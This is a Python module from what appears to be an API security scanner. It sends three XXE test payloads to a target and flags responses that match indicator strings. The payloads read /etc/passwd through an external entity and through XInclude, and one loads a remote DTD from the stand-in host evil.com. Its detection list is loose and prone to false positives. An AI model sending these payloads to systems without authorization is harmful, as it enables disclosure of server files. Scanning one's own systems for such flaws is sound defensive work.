#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class XXEScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, token: Optional[str] = None) -> List[Dict]:
        logger = setup_scanner_logger("xxe_check")
        vulnerabilities = []
        
        xxe_payloads = [
            {
                'name': 'Basic XXE',
                'content': '''<?xml version="1.0"?>
                    <!DOCTYPE data [
                        <!ENTITY file SYSTEM "file:///etc/passwd">
                    ]>
                    <data>&file;</data>'''
            },
            {
                'name': 'Parameter entities',
                'content': '''<?xml version="1.0"?>
                    <!DOCTYPE data [
                        <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
                        %remote;
                    ]>
                    <data>&exploit;</data>'''
            },
            {
                'name': 'XInclude attack',
                'content': '''<?xml version="1.0"?>
                    <data xmlns:xi="http://www.w3.org/2001/XInclude">
                        <xi:include parse="text" href="file:///etc/passwd"/>
                    </data>'''
            }
        ]
        
        headers = {
            'Authorization': f'Bearer {token}' if token else '',
            'Content-Type': 'application/xml'
        }
        
        for payload in xxe_payloads:
            try:
                response = requests.request(
                    method,
                    url,
                    data=payload['content'],
                    headers=headers,
                    timeout=5
                )
                
                if XXEScanner.is_xxe_vulnerable(response):  # Fix: Use class method
                    vuln = {
                        'type': 'XXE_INJECTION',
                        'severity': 'CRITICAL',
                        'detail': f'Potential XXE vulnerability with {payload["name"]}',
                        'evidence': {
                            'url': url,
                            'method': method,
                            'payload': payload['content'],
                            'status_code': response.status_code,
                            'response': response.text[:500]
                        }
                    }
                    vulnerabilities.append(vuln)
                    
            except requests.RequestException as e:
                logger.error(f"Error testing {payload['name']}: {str(e)}")
                
        return vulnerabilities
        
    @staticmethod
    def is_xxe_vulnerable(response: requests.Response) -> bool:
        """Check if the response indicates XXE vulnerability"""
        xxe_indicators = [
            'root:x:0:0',
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '<!ENTITY',
            'SYSTEM',
            'PUBLIC',
            'DTD',
            'xml version',
            'billion laughs',
            'lol1',
            'xxe',
            'XML parsing error',
            'XML document structures must start and end within the same entity'
        ]
        
        response_text = response.text.lower()
        return any(indicator.lower() in response_text for indicator in xxe_indicators)

scan = XXEScanner.scan